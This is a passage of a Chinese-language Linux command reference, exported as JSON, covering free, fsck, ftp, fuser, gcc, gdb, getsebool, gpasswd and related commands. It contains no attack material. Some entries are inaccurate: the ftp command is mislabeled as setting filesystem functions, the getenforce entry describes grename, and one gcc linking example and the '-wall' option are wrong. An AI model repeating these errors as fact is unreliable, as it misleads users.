cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，因为Buffer Cache就是缓存磁盘块的。但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。\n\nBuffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。\n\n简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。\n\n所以我们看linux,只要不用swap的交换空间,就不用担心自己的内存太少.如果常常swap用很多,可能你就要考虑加物理内存了.这也是linux看内存是否够用的标准.\n\n如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说free的内存太少了，也是该考虑优化程序或加内存了。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","free"]},{"title":"【Linux 命令】fsck","url":"/linux-command/fsck/","content":"\n检查并且试图修复文件系统中的错误\n\n## 补充说明\n\n**fsck命令** 被用于检查并且试图修复文件系统中的错误。当文件系统发生错误四化，可用fsck指令尝试加以修复。\n\n###  语法\n\n```shell\nfsck(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：自动修复文件系统，不询问任何问题；\n-A：依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统；\n-N：不执行指令，仅列出实际执行会进行的动作；\n-P：当搭配\"-A\"参数使用时，则会同时检查所有的文件系统；\n-r：采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式；\n-R：当搭配\"-A\"参数使用时，则会略过/目录的文件系统不予检查；\n-s：依序执行检查作业，而非同时执行；\n-t<文件系统类型>：指定要检查的文件系统类型；\n-T：执行fsck指令时，不显示标题信息；\n-V：显示指令执行过程。\n```\n\n###  参数\n\n文件系统：指定要查看信息的文件系统。\n\n###  实例\n\nlinux的文件系统损坏会导致linux不正常关机，出错的时候如果系统告诉你是哪一块硬盘的分区有问题，比如是`/dev/hda2`，接着用如下的命令去对付它：\n\n```shell\nfsck -y /dev/hda2\n```\n\n结束后使用reboot命令重启系统这样就好了！\n\n如果不知道时哪个地方出了问题，可以直接：\n\n```shell\nfsck\n```\n\n在随后的多个确认对话框中输入`:y`\n\n结束后同样使用reboot命令重启系统这样就好了！\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fsck"]},{"title":"【Linux 命令】ftp","url":"/linux-command/ftp/","content":"\n用来设置文件系统相关功能\n\n## 补充说明\n\n**ftp命令** 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。\n\n###  语法 \n\n```shell\nftp(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-d：详细显示指令执行过程，便于排错或分析程序执行的情况；\n-i：关闭互动模式，不询问任何问题；\n-g：关闭本地主机文件名称支持特殊字符的扩充特性；\n-n：不使用自动登录；\n-v：显示指令执行过程。\n```\n\n###  参数 \n\n主机：指定要连接的FTP服务器的主机名或ip地址。\n\n###  实例 \n\n```shell\nftp> ascii  # 设定以ASCII方式传送文件(缺省值) \nftp> bell   # 每完成一次文件传送,报警提示. \nftp> binary # 设定以二进制方式传送文件. \nftp> bye    # 终止主机FTP进程,并退出FTP管理方式. \nftp> case   # 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母. \nftp> cd     # 同UNIX的CD命令. \nftp> cdup   # 返回上一级目录. \nftp> chmod  # 改变远端主机的文件权限. \nftp> close  # 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除. \nftp> delete # 删除远端主机中的文件. \nftp> dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. \nftp> get [remote-file] [local-file] # 从远端主机中传送至本地主机中. \nftp> help [command] # 输出命令的解释. \nftp> lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录. \nftp> ls [remote-directory] [local-file] # 同DIR. \nftp> macdef                 # 定义宏命令. \nftp> mdelete [remote-files] # 删除一批文件. \nftp> mget [remote-files]    # 从远端主机接收一批文件至本地主机. \nftp> mkdir directory-name   # 在远端主机中建立目录. \nftp> mput local-files # 将本地主机中一批文件传送至远端主机. \nftp> open host [port] # 重新建立一个新的连接. \nftp> prompt           # 交互提示模式. \nftp> put local-file [remote-file] # 将本地一个文件传送至远端主机中. \nftp> pwd  # 列出当前远端主机目录. \nftp> quit # 同BYE. \nftp> recv remote-file [local-file] # 同GET. \nftp> rename [from] [to]     # 改变远端主机中的文件名. \nftp> rmdir directory-name   # 删除远端主机中的目录. \nftp> send local-file [remote-file] # 同PUT. \nftp> status   # 显示当前FTP的状态. \nftp> system   # 显示远端主机系统类型. \nftp> user user-name [password] [account] # 重新以别的用户名登录远端主机. \nftp> ? [command] # 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。\nftp> ! # 从 ftp 子系统退出到外壳。\n```\n\nFTP 匿名登录账号密码\n\n```shell\n账号：anonymous\n密码: anonymous@\n```\n\n\n关闭FTP连接\n\n```shell\nbye\nexit\nquit\n```\n\n下载文件\n\n```shell\nftp> get readme.txt # 下载 readme.txt 文件\nftp> mget *.txt     # 下载 \n```\n\n上传文件\n\n```shell\nftp> put /path/readme.txt # 上传 readme.txt 文件\nftp> mput *.txt           # 可以上传多个文件\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ftp"]},{"title":"【Linux 命令】ftpcount","url":"/linux-command/ftpcount/","content":"\n显示目前已FTP登入的用户人数\n\n## 补充说明\n\n显示目前已ftp登入的用户人数。执行这项指令可得知目前用FTP登入系统的人数以及FTP登入人数的上限。\n\n语法：\n\n```shell\nftpcount\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ftpcount"]},{"title":"【Linux 命令】ftpshut","url":"/linux-command/ftpshut/","content":"\n在指定的时间关闭FTP服务器\n\n## 补充说明\n\n功能说明：在指定的时间关闭ftp服务器。本指令提供系统管理者在设置的时间关闭FTP服务器，且能在关闭之前发出警告信息通知用户。关闭时间若设置后为\"none\"，则会马上关闭服务器。如果采 用\"+30\"的方式来设置表示服务器在30分钟之后关闭。依次类推，假设使用\"1130\"的格式则代表服务器会在每日的11时30分关闭，时间格式为24 小时制。FTP服务器关闭后，在/etc目录下会产生一个名称为shutmsg的文件，把它删除后即可再度启动FTP服务器的功能。\n\n语法：\n\n```shell\nftpshut [-d<分钟>][-l<分钟>][关闭时间][\"警告信息\"]\n```\n\n参数：\n\n```shell\n-d<分钟>   切断所有FTP连线时间。\n-l<分钟>   停止接受FTP登入的时间。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ftpshut"]},{"title":"【Linux 命令】ftptop","url":"/linux-command/ftptop/","content":"\nproftpd服务器的连接状态\n\n## 补充说明\n\n**ftptop命令** 类似于top命令的显示风格显示proftpd服务器的连接状态。\n\n###  语法\n\n```shell\nftptop(选项)\n```\n\n###  选项\n\n```shell\n-D：过滤正在下载的会话；\n-S：仅显示指定虚拟主机的连接状态；\n-d：指定屏幕刷新时间，默认\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ftptop"]},{"title":"【Linux 命令】ftpwho","url":"/linux-command/ftpwho/","content":"\n显示当前每个ftp会话信息\n\n## 补充说明\n\n**ftpwho命令** ftp服务器套件proftpd的工作指令，用于显示当前每个ftp会话信息。\n\n###  语法\n\n```shell\nftpwho(选项)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n-v：详细模式，输出更多信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ftpwho"]},{"title":"【Linux 命令】fuser","url":"/linux-command/fuser/","content":"\n使用文件或文件结构识别进程\n\n## 补充说明\n\n**fuser命令** 用于报告进程使用的文件和网络套接字。fuser命令列出了本地进程的进程号，那些本地进程使用file，参数指定的本地或远程文件。对于阻塞特别设备，此命令列出了使用该设备上任何文件的进程。\n\n每个进程号后面都跟随一个字母，该字母指示进程如何使用文件。\n\n* `c` ：指示进程的工作目录。\n* `e` ：指示该文件为进程的可执行文件(即进程由该文件拉起)。\n* `f` ：指示该文件被进程打开，默认情况下f字符不显示。\n* `F` ：指示该文件被进程打开进行写入，默认情况下F字符不显示。\n* `r` ：指示该目录为进程的根目录。\n* `m` ：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存。\n\n###  语法\n\n```shell\nfuser(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：显示命令行中指定的所有文件；\n-k：杀死访问指定文件的所有进程；\n-i：杀死进程前需要用户进行确认；\n-l：列出所有已知信号名；\n-m：指定一个被加载的文件系统或一个被加载的块设备；\n-n：选择不同的名称空间；\n-u：在每个进程后显示所属的用户名。\n```\n\n###  参数\n\n文件：可以是文件名或者TCP、UDP端口号。\n\n###  实例\n\n要列出使用`/etc/passwd`文件的本地进程的进程号，请输入：\n\n```shell\nfuser /etc/passwd\n```\n\n要列出使用`/etc/filesystems`文件的进程的进程号和用户登录名，请输入：\n\n```shell\nfuser -u /etc/filesystems\n```\n\n要终止使用给定文件系统的所有进程，请输入：\n\n```shell\nfuser -k -x -u -c /dev/hd1  或者  fuser -kxuc /home\n```\n\n任一命令都列出了进程号和用户名，然后终止每个正在使用`/dev/hd1 (/home)`文件系统的进程。仅有root用户能终止属于另一用户的进程。如果您正在试图卸下`/dev/hd1`文件系统，而一个正在访问`/dev/hd1`文件系统的进程不允许这样，您可能希望使用此命令。\n\n要列出正在使用已从给定文件系统删除的文件的全部进程，请输入：\n\n```shell\nfuser -d /usr文件\n```\n\n`/dev/kmem` 用于系统映像。  \n`/dev/mem`  也用于系统映像。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","fuser"]},{"title":"【Linux 命令】gcc","url":"/linux-command/gcc/","content":"\n基于C/C++的编译器\n\n## 补充说明\n\n**gcc命令** 使用GNU推出的基于 `C/C++` 的编译器，是开放源代码领域应用最广泛的编译器，具有功能强大，编译代码支持性能优化等特点。现在很多程序员都应用 `GCC`，怎样才能更好的应用 `GCC`。目前，`GCC` 可以用来编译 `C/C++`、`FORTRAN`、`JAVA`、`OBJC`、`ADA`等语言的程序，可根据需要选择安装支持的语言。\n\n###  语法\n\n```shell\ngcc(选项)(参数)\n```\n\n###  选项\n\n```shell\n-o：指定生成的输出文件；\n-E：仅执行编译预处理；\n-S：将C代码转换为汇编代码；\n-wall：显示警告信息；\n-c：仅执行编译操作，不进行连接操作。\n```\n\n###  参数\n\nC源文件：指定C语言源代码文件。\n\n###  实例\n\n**常用编译命令选项** \n\n假设源程序文件名为test.c\n\n**无选项编译链接** \n\n```shell\ngcc test.c\n```\n\n将 `test.c` 预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为 `a.out`。\n\n**选项 -o** \n\n```shell\ngcc test.c -o test\n```\n\n将 `test.c` 预处理、汇编、编译并链接形成可执行文件 `test`。`-o` 选项用来指定输出文件的文件名。\n\n**选项 -E** \n\n```shell\ngcc -E test.c -o test.i\n```\n\n将 `test.c` 预处理输出 `test.i` 文件。\n\n**选项 -S** \n\n```shell\ngcc -S test.i\n```\n\n将预处理输出文件 `test.i` 汇编成 `test.s` 文件。\n\n**选项 -c** \n\n```shell\ngcc -c test.s\n```\n\n将汇编输出文件 `test.s` 编译输出 `test.o` 文件。\n\n**无选项链接** \n\n```shell\ngcc test.o -o test\n```\n\n将编译输出文件 `test.o` 链接成最终可执行文件 `test`。\n\n**选项 -O** \n\n```shell\ngcc -O1 test.c -o test\n```\n\n使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。\n\n**多源文件的编译方法** \n\n如果有多个源文件，基本上有两种编译方法：\n\n假设有两个源文件为 `test.c` 和 `testfun.c`\n\n**多个文件一起编译** \n\n```shell\ngcc testfun.c test.c -o test\n```\n\n将 `testfun.c` 和 `test.c` 分别编译后链接成 `test` 可执行文件。\n\n**分别编译各个源文件，之后对编译后输出的目标文件链接。** \n\n```shell\ngcc -c testfun.c    #将testfun.c编译成testfun.o\ngcc -c test.c       #将test.c编译成test.o\ngcc -o testfun.o test.o -o test    #将testfun.o和test.o链接成test\n```\n\n以上两种方法相比较，第一中方法编译时需要所有文件重新编译，而第二种方法可以只重新编译修改的文件，未修改的文件不用重新编译。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gcc"]},{"title":"【Linux 命令】gcov","url":"/linux-command/gcov/","content":"\n测试程序的代码覆盖率的工具\n\n## 补充说明\n\n**gcov命令** 是一款测试程序的代码覆盖率的工具。\n\n###  语法\n\n```shell\ngcov(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n-v：显示版本信息；\n-a：输出所有的基本块的执行计数；\n-n：并创建输出文件。\n```\n\n###  参数\n\nV语言文件：C语言源代码文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gcov"]},{"title":"【Linux 命令】gdb","url":"/linux-command/gdb/","content":"\n功能强大的程序调试器\n\n## 补充说明\n\n**gdb命令** 包含在GNU的gcc开发套件中，是功能强大的程序调试器。GDB中的命令固然很多，但我们只需掌握其中十个左右的命令，就大致可以完成日常的基本的程序调试工作。\n\n### 语法\n\n```shell\ngdb(选项)(参数)\n```\n\n### 选项\n\n```shell\n-cd：设置工作目录；\n-q：安静模式，不打印介绍信息和版本信息；\n-d：添加文件查找路径；\n-x：从指定文件中执行GDB指令；\n-s：设置读取的符号表文件。\n```\n\n\n命令 | 解释 | 示例\n--- | --- | ---\nfile <文件名> | 加载被调试的可执行程序文件。<br /> 因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。 | (gdb) file gdb-sample \nr | Run的简写，运行被调试的程序。<br /> 如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。 | (gdb) r\nc | Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。 | (gdb) c\nb <行号><br />b <函数名称><br />b *<函数名称><br />b *<代码地址> d [编号]  | b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。 <br /> 其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。 d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 | (gdb) b 8(gdb) b main <br /> (gdb) b *main <br /> (gdb) b *0x804835c (gdb) d\ns, n | s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br /> n: 执行一行源程序代码，此行代码中的函数调用也一并执行。 s 相当于其它调试器中的“Step Into (单步跟踪进入)”；<br /> n 相当于其它调试器中的“Step Over (单步跟踪)”。 这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。 | (gdb) s <br /> (gdb) n\nsi, ni | si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。 | (gdb) si <br />(gdb) ni\np <变量名称> | Print的简写，显示指定变量（临时变量或全局变量）的值。 | (gdb) p i <br /> (gdb) p nGlobalVar\ndisplay ... undisplay <编号> | display，设置程序中断后欲显示的数据及其格式。 <br /> 例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令 <br /> “display /i $pc” <br /> 其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。 undispaly，取消先前的display设置，编号从1开始递增。 | (gdb) display /i $pc (gdb) undisplay 1\ni | info的简写，用于显示各类信息，详情请查阅“help i”。 | (gdb) i r\nq | Quit的简写，退出GDB调试环境。 | (gdb) q\nhelp [命令名称] | GDB帮助命令，提供对GDB名种命令的解释说明。<br /> 如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。 | (gdb) help\n\n### 参数\n\n文件：二进制可执行程序。\n\n### 实例\n\n以下是linux下dgb调试的一个实例，先给出一个示例用的小程序，C语言代码：\n\n```shell\n#include <stdio.h>\nint nGlobalVar = 0;\n\nint tempFunction(int a, int b)\n{\n    printf(\"tempFunction is called, a = %d, b = %d /n\", a, b);\n    return (a + b);\n}\n\nint main()\n{\n    int n;\n        n = 1;\n        n++;\n        n--;\n\n        nGlobalVar += 100;\n        nGlobalVar -= 12;\n\n    printf(\"n = %d, nGlobalVar = %d /n\", n, nGlobalVar);\n\n        n = tempFunction(1, 2);\n    printf(\"n = %d\", n);\n\n    return 0;\n}\n```\n\n请将此代码复制出来并保存到文件 gdb-sample.c 中，然后切换到此文件所在目录，用GCC编译之：\n\n```shell\ngcc gdb-sample.c -o gdb-sample -g\n```\n\n在上面的命令行中，使用 -o 参数指定了编译生成的可执行文件名为 gdb-sample，使用参数 -g 表示将源代码信息编译到可执行文件中。如果不使用参数 -g，会给后面的GDB调试造成不便。当然，如果我们没有程序的源代码，自然也无从使用 -g 参数，调试/跟踪时也只能是汇编代码级别的调试/跟踪。\n\n下面“gdb”命令启动GDB，将首先显示GDB说明，不管它：\n\n```shell\nGNU gdb Red Hat Linux (5.3post-0.20021129.18rh)\nCopyright 2003 free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\ntype \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB. Type \"show warranty\" for details.\nThis GDB was configured as \"i386-redhat-linux-gnu\".\n(gdb)\n```\n\n上面最后一行“(gdb)”为GDB内部命令引导符，等待用户输入GDB命令。\n\n下面使用“file”命令载入被调试程序 gdb-sample（这里的 gdb-sample 即前面 GCC 编译输出的可执行文件）：\n\n```shell\n(gdb) file gdb-sample\nReading symbols from gdb-sample...done.\n```\n\n上面最后一行提示已经加载成功。\n\n下面使用“r”命令执行（Run）被调试文件，因为尚未设置任何断点，将直接执行到程序结束：\n\n```shell\n(gdb) r\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\nn = 1, nGlobalVar = 88\ntempFunction is called, a = 1, b = 2\nn = 3\nProgram exited normally.\n```\n\n下面使用“b”命令在 main 函数开头设置一个断点（Breakpoint）：\n\n```shell\n(gdb) b main\nBreakpoint 1 at 0x804835c: file gdb-sample.c, line 19.\n```\n\n上面最后一行提示已经成功设置断点，并给出了该断点信息：在源文件 gdb-sample.c 第19行处设置断点；这是本程序的第一个断点（序号为1）；断点处的代码地址为 0x804835c（此值可能仅在本次调试过程中有效）。回过头去看源代码，第19行中的代码为“n = 1”，恰好是 main 函数中的第一个可执行语句（前面的“int n;”为变量定义语句，并非可执行语句）。\n\n再次使用“r”命令执行（Run）被调试程序：\n\n```shell\n(gdb) r\nStarting program: /home/liigo/temp/gdb-sample\n\nBreakpoint 1, main () at gdb-sample.c:19\n19 n = 1;\n```\n\n程序中断在gdb-sample.c第19行处，即main函数是第一个可执行语句处。\n\n上面最后一行信息为：下一条将要执行的源代码为“n = 1;”，它是源代码文件gdb-sample.c中的第19行。\n\n下面使用“s”命令（Step）执行下一行代码（即第19行“n = 1;”）：\n\n```shell\n(gdb) s\n20 n++;\n```\n\n上面的信息表示已经执行完“n = 1;”，并显示下一条要执行的代码为第20行的“n++;”。\n\n既然已经执行了“n = 1;”，即给变量 n 赋值为 1，那我们用“p”命令（Print）看一下变量 n 的值是不是 1 ：\n\n```shell\n(gdb) p n\n$1 = 1\n```\n\n果然是 1。（$1大致是表示这是第一次使用“p”命令——再次执行“p n”将显示“$2 = 1”——此信息应该没有什么用处。）\n\n下面我们分别在第26行、tempFunction 函数开头各设置一个断点（分别使用命令“b 26”“b tempFunction”）：\n\n```shell\n(gdb) b 26\nBreakpoint 2 at 0x804837b: file gdb-sample.c, line 26.\n(gdb) b tempFunction\nBreakpoint 3 at 0x804832e: file gdb-sample.c, line 12.\n```\n\n使用“c”命令继续（Continue）执行被调试程序，程序将中断在第二 个断点（26行），此时全局变量 nGlobalVar 的值应该是 88；再一次执行“c”命令，程序将中断于第三个断点（12行，tempFunction 函数开头处），此时tempFunction 函数的两个参数 a、b 的值应分别是 1 和 2：\n\n```shell\n(gdb) c\nContinuing.\n\nBreakpoint 2, main () at gdb-sample.c:26\n26 printf(\"n = %d, nGlobalVar = %d /n\", n, nGlobalVar);\n(gdb) p nGlobalVar\n$2 = 88\n(gdb) c\nContinuing.\nn = 1, nGlobalVar = 88\n\nBreakpoint 3, tempFunction (a=1, b=2) at gdb-sample.c:12\n12 printf(\"tempFunction is called, a = %d, b = %d /n\", a, b);\n(gdb) p a\n$3 = 1\n(gdb) p b\n$4 = 2\n```\n\n上面反馈的信息一切都在我们预料之中~~\n\n再一次执行“c”命令（Continue），因为后面再也没有其它断点，程序将一直执行到结束：\n\n```shell\n(gdb) c\nContinuing.\ntempFunction is called, a = 1, b = 2\nn = 3\nProgram exited normally.\n```\n\n有时候需要看到编译器生成的汇编代码，以进行汇编级的调试或跟踪，又该如何操作呢？\n\n这就要用到display命令“display /i $pc”了（此命令前面已有详细解释）：\n\n```shell\n(gdb) display /i $pc\n(gdb)\n```\n\n此后程序再中断时，就可以显示出汇编代码了：\n\n```shell\n(gdb) r\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\n\nBreakpoint 1, main () at gdb-sample.c:19\n19 n = 1;\n1: x/i $pc 0x804835c <main+16>: movl $0x1,0xfffffffc(%ebp)\n```\n\n看到了汇编代码，“n = 1;”对应的汇编代码是“movl $0x1,0xfffffffc(%ebp)”。\n\n并且以后程序每次中断都将显示下一条汇编指定（“si”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：\n\n```shell\n(gdb) si\n20 n++;\n1: x/i $pc 0x8048363 <main+23>: lea 0xfffffffc(%ebp),%eax\n(gdb) si\n0x08048366 20 n++;\n1: x/i $pc 0x8048366 <main+26>: incl (%eax)\n(gdb) si\n21 n--;\n1: x/i $pc 0x8048368 <main+28>: lea 0xfffffffc(%ebp),%eax\n(gdb) si\n0x0804836b 21 n--;\n1: x/i $pc 0x804836b <main+31>: decl (%eax)\n(gdb) si\n23 nGlobalVar += 100;\n1: x/i $pc 0x804836d <main+33>: addl $0x64,0x80494fc\n```\n\n接下来我们试一下命令“b *<函数名称>”。\n\n为了更简明，有必要先删除目前所有断点（使用“d”命令——Delete breakpoint）：\n\n```shell\n(gdb) d\nDelete all breakpoints? (y or n) y\n(gdb)\n```\n\n当被询问是否删除所有断点时，输入“y”并按回车键即可。\n\n下面使用命令“b *main”在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）：\n\n```shell\n(gdb) b *main\nBreakpoint 4 at 0x804834c: file gdb-sample.c, line 17.\n(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\n\nBreakpoint 4, main () at gdb-sample.c:17\n17 {\n1: x/i $pc 0x804834c <main>: push %ebp\n(gdb) si\n0x0804834d 17 {\n1: x/i $pc 0x804834d <main+1>: mov %esp,%ebp\n(gdb) si\n0x0804834f in main () at gdb-sample.c:17\n17 {\n1: x/i $pc 0x804834f <main+3>: sub $0x8,%esp\n(gdb) si\n0x08048352 17 {\n1: x/i $pc 0x8048352 <main+6>: and $0xfffffff0,%esp\n(gdb) si\n0x08048355 17 {\n1: x/i $pc 0x8048355 <main+9>: mov $0x0,%eax\n(gdb) si\n0x0804835a 17 {\n1: x/i $pc 0x804835a <main+14>: sub %eax,%esp\n(gdb) si\n19 n = 1;\n1: x/i $pc 0x804835c <main+16>: movl $0x1,0xfffffffc(%ebp)\n```\n\n此时可以使用“i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：\n\n```shell\n(gdb) i r\neax 0xbffff6a4 -1073744220\necx 0x42015554 1107383636\nedx 0x40016bc8 1073834952\nebx 0x42130a14 1108544020\nesp 0xbffff6a0 0xbffff6a0\nebp 0xbffff6a8 0xbffff6a8\nesi 0x40015360 1073828704\nedi 0x80483f0 134513648\neip 0x8048366 0x8048366\neflags 0x386 902\ncs 0x23 35\nss 0x2b 43\nds 0x2b 43\nes 0x2b 43\nfs 0x0 0\ngs 0x33 51\n```\n\n当然也可以显示任意一个指定的寄存器值：\n\n```shell\n(gdb) i r eax\neax 0xbffff6a4 -1073744220\n```\n\n最后一个要介绍的命令是“q”，退出（Quit）GDB调试环境：\n\n```shell\n(gdb) q\nThe program is running. exit anyway? (y or n)\n```\n\n## 补充内容\n\n> gdb 教程：[慕课网-Linux C语言指针与内存-第三章](http://www.imooc.com/learn/394)\n\n如果删除源代码, 就无法显示行号等辅助信息了\n\n```shell\ngcc -g gdb.c -o gdb.out # -g 支持gdb调试; -o 输出, 默认为 a.out\n\ngdb gdb.out # 进入 gdb 调试环境\nenter # 继续执行上条命令\nl # 列出源代码, 默认 10 行, 按 l 继续\n\nstart # 开始单步调试, 默认 main() 第一行\np a # 查看 a 变量的值\nn # 继续到下一行\ns # 进入子函数\nbt # 查看函数栈\nf 1 # 切换函数栈\n\nq 退出调试\n```\n\n测试用代码\n\n```c\n#include <stdio.h>\n\nvoid change(int a, int b){\n    int tmp=a;\n    a=b; b=tmp;\n}\n\nvoid change2(int *a, int *b){\n    int tmp=*a;\n    *a=*b; *b=tmp;\n}\n\nint main(){\n    int a=5,b=3;\n    change(a,b);\n    printf(\"change:\\na=%d\\nb=%d\\n\", a,b);\n    change2(&a,&b);\n    printf(\"change2:\\na=%d\\nb=%d\\n\", a,b);\n}\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","gdb"]},{"title":"【Linux 命令】get_module","url":"/linux-command/get_module/","content":"\n获取Linux内核模块的详细信息\n\n## 补充说明\n\n**get_module命令** 用于获取Linux内核模块的详细信息。\n\n###  语法\n\n```shell\nget_module 模块名\n```\n\n###  实例\n\n使用lsmod命令查看内核模块：\n\n```shell\nlsmod | head -5\nModule                  Size  Used by\nipv6                  272801  15\nxfrm_nalgo             13381  1 ipv6\ncrypto_api             12609  1 xfrm_nalgo\nip_conntrack_ftp       11569  0\n```\n\n使用get_module命令查看模块详细信息：\n\n```shell\nget_module ipv6\n        refcnt               : 15\n        srcversion           : 8CC9C024755B4483E56C0EF\n\nParameters:\n        autoconf             : 1\n        disable              : 0\n        disable_ipv6         : 0\nSections:\n        .altinstr_replacement : 0xf8f1a3cf\n        .altinstructions     : 0xf8f1d03c\n        .bss                 : 0xf8f36000\n        .data.read_mostly    : 0xf8f34d20\n        .data                : 0xf8f2f7a0\n        .exit.text           : 0xf8f1a234\n        .gnu.linkonce.this_module : 0xf8f34e00\n        .init.data           : 0xf8a16a60\n        .init.text           : 0xf8a16000\n        .module_sig          : 0xf8f37960\n        .rodata.str1.1       : 0xf8f1ae46\n        .rodata              : 0xf8f1a420\n        .smp_locks           : 0xf8f1d150\n        .strtab              : 0xf8f29840\n        .symtab              : 0xf8f24000\n        .text                : 0xf8ef5000\n        __kcrctab            : 0xf8f1de70\n        __kcrctab_gpl        : 0xf8f1d9cc\n        __ksymtab            : 0xf8f1dd78\n        __ksymtab_gpl        : 0xf8f1d954\n        __ksymtab_strings    : 0xf8f1da44\n        __param              : 0xf8f1da08\n        __versions           : 0xf8f1df00\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","get_module"]},{"title":"【Linux 命令】getenforce","url":"/linux-command/getenforce/","content":"\n显示当前SELinux的应用模式，是强制、执行还是停用\n\n## 补充说明\n\n**grename命令** 可以重命名卷组的名称。\n\n###  语法\n\n```shell\ngetenforce\n```\n\n### 例子\n\n查看当前SELinux的应用模式。\n\n```shell\n[root@localhost ~]# getenforce\nEnforcing\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","getenforce"]},{"title":"【Linux 命令】getsebool","url":"/linux-command/getsebool/","content":"\n查询SElinux策略内各项规则的布尔值\n\n## 补充说明\n\n**getsebool命令** 是用来查询SElinux策略内各项规则的布尔值。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n###  语法\n\n```shell\ngetsebool [-a] [布尔值条款]\n```\n\n###  选项\n\n```shell\n-a：列出目前系统上面的所有布尔值条款设置为开启或关闭值。\n```\n\n###  实例\n\n查询本系统内所有的布尔值设置状况：\n\n```shell\ngetsebool -a\nNetworkManager_disable_trans --> off\nallow_console_login --> off\nallow_cvs_read_shadow --> off\nallow_daemons_dump_core --> on\n....(底下省略)....\n```\n\n查询httpd_enable_homedirs是否为关闭，若没关闭，请关闭它：\n\n```shell\ngetsebool httpd_enable_homedirs\nsetsebool -P httpd_enable_homedirs=0    # 0是关闭  1是开启\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","getsebool"]},{"title":"【Linux 命令】gpasswd","url":"/linux-command/gpasswd/","content":"\nLinux下工作组文件的管理工具\n\n## 补充说明\n\n**gpasswd命令** 是Linux下工作组文件`/etc/group`和`/etc/gshadow`管理工具。\n\n###  语法\n\n```shell\ngpasswd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：添加用户到组；\n-d：从组删除用户；\n-A：指定管理员；\n-M：指定组成员和-A的用途差不多；\n-r：删除密码；\n-R：限制用户登入组，只有组中的成员才可以用newgrp加入该组。\n```\n\n###  参数\n\n组：指定要管理的工作组。\n\n###  